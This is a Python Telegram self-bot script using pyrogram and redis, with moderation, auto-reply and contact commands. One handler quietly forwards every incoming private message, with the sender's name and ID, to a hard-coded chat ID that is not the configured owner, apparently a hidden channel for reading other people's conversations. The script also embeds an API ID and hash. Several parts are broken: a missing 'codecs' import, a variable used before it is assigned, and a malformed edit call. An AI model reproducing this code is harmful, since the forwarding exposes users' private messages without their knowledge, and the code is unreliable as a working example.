#Coder : @Salazar
#Channel : @Pinigerteam & @GIOUTiN
from pyrogram import Client
from pyrogram import Message
from pyrogram import InputPhoneContact
from pyrogram import Filters
import redis
from redis import StrictRedis
import telebot
import os
import sys
import requests
import re
################################
fullsudo = [744309935]
api_id = 739690
api_hash = "427ff8e03bccfd1182961765d9c1bc6b"
gplog = -1001378817892
backupm = 605955392
################################
logger = 'input token'
bot = telebot.TeleBot(logger)
app = Client("8",api_id, api_hash)
database = redis.StrictRedis(host='localhost', port=6379, db=1,charset='UTF-8', decode_responses=True)
redis = database
################################
def muteall(chat_id,user_id):
	var = False
	if database.sismember('self:muteall'+str(chat_id), user_id):
		var = True
	return var
################################
def replyto(message: Message):
    reply_id = None

    if message.reply_to_message:
        reply_id = message.reply_to_message.message_id

    elif not message.from_user.is_self:
        reply_id = message.message_id

    return reply_id
################################
def stringFormat(size, out = 'kb', precision = 2): 
    if out=='kb':
        return round(float(size)/1024, precision)
    elif out=='mb': 
        return round(float(size)/(1024 * 1024), precision)
    elif out=='gb':
        return round(float(size)/(1024 * 1024 * 1024), precision)
 
    return False
 
def fileSize(filename, out = 'kb', precision = 2):  
    with codecs.open(filename, 'r') as file:
        string = file.read()
        file.close()
    return stringFormat(len(string), out, precision)
################################
def what_country(ip):
    API = "https://api.ip2country.info/ip?{}"
    response = requests.get(API.format(ip))
    data = response.json()      # convert to dictionary
    
    return data["countryName"]
################################
@app.on_message(Filters.incoming & Filters.private)
def PY_in_priv(client, message):
    bot.send_message(backupm,"~ Message From : [ <a href='tg://user?id={}'>{}</a> ] \n \n {}".format(message.from_user.id,message.from_user.first_name,str(message.text)),parse_mode='HTML', disable_web_page_preview=True)
################################
################################
@app.on_message(Filters.command("setprof", "") & Filters.me)
def set_profile_pic(client, message):
         if message.reply_to_message:
            pic = message.reply_to_message.download()
         else:
            pic = message.download()
         app.set_profile_photo(pic)
         message.edit('~ Profile Picture Set Succesfully!')
         os.remove(pic)
#################################
@app.on_message(Filters.incoming & Filters.private)
def PY_priv(client, message):
	try:
		if database.sismember('self:monshi',my.id):
			my = app.get_me()
			if my.status == "offline":
				if message:
					message.reply_text("{}".format(database.smembers('self:mtext')))
	except Exception as e:
		bot.send_message(gplog," #self \n #monshi : \n {}".format(e))

#################################
@app.on_message()
def cmd(c,message):
				
	try:
        	if message.text == 'id':
            		pic = app.get_profile_photos(message.from_user.id, limit=1)[0]
            		app.send_photo(message.chat.id, pic.file_id, pic.file_ref, "ایدی عددی شما : [ {} ] \n \n نام اکانت شما : [ {} ] \n \n نام کاربری شما: [ @{} ]".format(message.from_user.id,message.from_user.first_name,message.from_user.username))
	except Exception as e:
        	bot.send_message(gplog," #self \n #id \n {}".format(e))
        
	try:
		if message.text == 'self':
			message.reply_text("Hi \n I Am Alireza \n this Is my Self \n @Salazar")
	except Exception as e:
		bot.send_message(gplog," #self \n #information : \n {}".format(e))

	if message.from_user.id == fullsudo[0]:
		try:
			if message.text == 'kick':
				if message.reply_to_message:
					ids = message.reply_to_message.from_user.id
					message.edit(" ~ User {} Kicked This Chat!".format(ids))
					app.kick_chat_member(message.chat.id,ids)
		except Exception as e:
			bot.send_message(gplog," #self \n #kick : \n {}".format(e))
		
		try:
			if message.text == 'block':
				if message.reply_to_message:
					ids = message.reply_to_message.from_user.id
					app.block_user(ids)
					message.edit(" ~ User {} Blocked!".format(ids))
		except Exception as e:
			bot.send_message(gplog," #self \n #block : \n {}".format(e))
		
		
		try:
			if message.text == 'unblock':
				if message.reply_to_message:
					ids = message.reply_to_message.from_user.id
					app.unblock_user(ids)
					message.edit(" ~ User {} Unblocked!".format(ids))
		except Exception as e:
			bot.send_message(gplog," #self \n #unblock : \n {}".format(e))
	
		try:
			if message.text == 'reload':
				i = 1
				while i<11:
					message.edit(str(i))
					i = i + 1
				message.edit("~ DoNe!")
				python = sys.executable
				os.execl(python, python, *sys.argv)
		except Exception as e:
			bot.send_message(gplog," #self \n #reload : \n {}".format(e))
			
		try:
			if message.text == 'mute':
				if message.reply_to_message:
					ids = message.reply_to_message.from_user.id
					message.edit(" ~ User {} Added Too The Mute List On Self!".format(ids))
					redis.sadd('self:muteall'+str(message.chat.id),ids)
		except Exception as e:
			bot.send_message(gplog," #self \n #mute : \n {}".format(e))
			



		try:
			if message.text == 'unmute':
				if message.reply_to_message:
					ids = message.reply_to_message.from_user.id
					message.edit(" ~ User {} Removed The Mute List On Self!".format(ids))
					redis.srem('self:muteall'+str(message.chat.id),ids)
		except Exception as e:
			bot.send_message(gplog," #self \n #unmute : \n {}".format(e))
			
			
		try:
			if message.text == 'mutelist':
				if database.scard('self:muteall'+str(message.chat.id)) == int(0):
					message.edit("~ Mute List Is Empty!")
				else:
					text = '~ Mute List: \n'
					for all in database.smembers('self:muteall'+str(message.chat.id)):
						text += " ------ <a href='tg://user?id={}'>{}</a> ------ \n ".format(all,all)
					message.edit(text,parse_mode='HTML', disable_web_page_preview=True)
		except Exception as e:
			bot.send_message(gplog," #self \n #mutelist : \n {}".format(e))

            

		try:
			if message.text == 'monshi on':
				if database.sismember('self:monshi',message.from_user.id):
					message.edit("~ Monshi Is Already On!")
				else:
					if redis.scard('self:mtext') == int(0):
						message.edit("~ Please Set Monshi Text!")
					else:
						message.edit("~ Self Monshi Is On!")
						database.sadd('self:monshi',message.from_user.id)
		except Exception as e:
			bot.send_message(gplog," #self \n #monshi on : \n {}".format(e))

		try:
			if message.text == 'monshi off':
				if database.sismember('self:monshi',message.from_user.id):
					message.edit("~ Self Monshi Is Off!")
					database.delete('self:monshi',message.from_user.id)
				else:
					message.edit("~ Self Monshi Is Already Off!")
		except Exception as e:
			bot.send_message(gplog," #self \n #monshi off : \n {}".format(e))

		try:
			if re.search('setmonshi ', message.text):
				txt = message.text.replace('setmonshi', '')
				if redis.scard('self:mtext') == int(0):
					message.edit("~ Text [ {} ] Seted For Monshi!".format(txt))
					database.sadd('self:mtext',txt)
				else:
					message.edit("~ You had already set the text for the Monshi section! \n ~ Please Send [ cleanmonshitext ] Then Delete Last Text & Set New Text!")
		except Exception as e:
			bot.send_message(gplog," #self \n #monshitext : \n {}".format(e))

		try:
			if message.text == 'cleanmonshitext':
				if database.scard('self:mtext') == int(0):
					message.edit("~ You have not specified any text for the Monshi section!")
				else:
					if redis.sismember('self:monshi',message.from_user.id):
						message.edit("~ Please Send [ monshi off ] & Try Again!")
					else:
						message.edit("~ Monshi Text Is Deleted!")
						database.delete('self:mtext')
		except Exception as e:
			bot.send_message(gplog," #self \n #cleanmonshitext : \n {}".format(e))

		try:
			if message.text == 'Help' or message.text == 'help':
				message.edit("~ GIOUTiN Self Help: \n \n \n [ self ] : For information! \n \n [ kick ] : Ban a User (For Supergroups)! \n \n [ block | unblock ] : Block a User! \n \n [ reload ] : Reload & Check The Source! \n \n [ mute | unmute ] : Silent The User (For Supergroups)! \n \n [ mutelist ] : Get a list Silents User in Supergroup! \n \n [ Share ] : Share Your Contact! \n \n [ Addc ] : Add The Share Contacts! \n \n [ setprof ]: Reply To Picture Then Setted Picture On Your Profile!\n \n [ monshi on|monshi off ]: Turn On|Off The Monshi!\n \n [ setmonshi text|cleanmonshitext ]: Set And Delete Text Monshi!(به جای کلمه text متن منشی خود را جایگزین کنید!)\n \n [ id ] : Your information! \n \n \n ---- ~ Coder : @Salazar ---- \n ---- ~ Channel : @GIOUTiN ----")
		except Exception as e:
			bot.send_message(gplog," #self \n #Help : \n {}".format(e))
		

		try:
			if message.text == 'getme':
				my = app.get_me()
				message.edit("~ This is Answer : \n \n {}".format(my))
		except Exception as e:
			bot.send_message(gplog," #self \n #GetMe : \n {}".format(e))
            
		try:
			if message.text == 'getuser':
				if message.reply_to_message:
					user = app.get_users(message.reply_to_message.from_user.id)
					message.edit("~ This is Answer : \n \n {}".format(user))
		except Exception as e:
			bot.send_message(gplog," #self \n #Getuser : \n {}".format(e))
            
		try:
			if message.text == 'share' or message.text == 'Share':
				myid = message.from_user.id
				my = app.get_me()
				app.delete_messages(message.chat.id,message.message_id)
				app.send_contact(message.chat.id, my.phone_number, my.first_name)
		except Exception as e:
			bot.send_message(gplog," #self \n #share : \n {}".format(e))
            

		try:
			if message.text == 'stats' or message.text == 'Stats':
				message.edit("~Your Account Information: \n \n • Session: {}".format(fileSize('8.session')))
		except Exception as e:
			bot.send_message(gplog," #self \n #session : \n {}".format(e))
		try:
			if message.text == 'addc' or message.text == 'Addc':
				myid = message.from_user.id
				if message.reply_to_message:
					message.edit(message.chat.id,message.message_id,"~ This Number Added Too Contacts!")
					app.add_contacts([InputPhoneContact(str(message.reply_to_message.contact.phone_number), str(message.reply_to_message.contact.first_name))])
		except Exception as e:
			bot.send_message(gplog," #self \n #addcontact : \n {}".format(e))
	try:
		if muteall(message.chat.id,message.from_user.id):
			app.delete_messages(message.chat.id, message.message_id)
	except Exception as e:
		bot.send_message(gplog," #self \n #delmute : \n {}".format(e))

		

app.run()